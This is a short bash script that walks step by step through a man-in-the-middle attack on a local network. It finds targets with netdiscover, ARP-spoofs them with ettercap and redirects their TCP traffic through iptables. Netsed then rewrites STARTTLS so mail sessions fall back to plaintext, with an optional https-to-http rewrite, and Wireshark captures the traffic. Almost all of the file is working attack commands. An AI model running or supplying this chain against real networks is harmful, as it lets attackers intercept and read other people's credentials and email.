#!/bin/bash

# The following commands can be used to perform an ARP spoof and TLS downgrade
# NOTE: commands may vary based on network configuration, IP addresses etc

# 1 - Use netdiscover to find the target devices on the network

sudo netdiscover

# 2 - Set up arp spoof using ettercap (GUI)

sudo ettercap -G &

# 4 - Redirect intercepted packets from the source to port 42069

sleep 1
read -p "Enter source IP address: " SRCIP
read -p "Enter port to redirect to: " RDPORT
sudo iptables -t nat -A PREROUTING -p tcp -s $SRCIP --dport 1:65535 -j REDIRECT --to-port $RDPORT

# 5 - Replace STARTTLS command

# Replaces STARTTLS with ABCDEFGH for server but client will only see STARTTLS
sudo netsed tcp 42069 0 0 's/250-STARTTLS//i' 's/STARTTLS/ABCDEFGH/o' 's/ABCDEFGH/STARTTLS/i'

# Same as above, but changes https to http
#sudo netsed tcp 42069 0 0 's/250-STARTTLS//i' 's/STARTTLS/ABCDEFGH/o' 's/ABCDEFGH/STARTTLS/i' 's/https/http/o'

# 6 - Launch Wireshark and sniff packets
sudo wireshark -I